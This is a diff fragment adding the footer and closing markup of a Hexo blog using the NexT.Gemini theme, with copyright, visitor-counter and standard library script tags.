+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">2.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">35:40</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
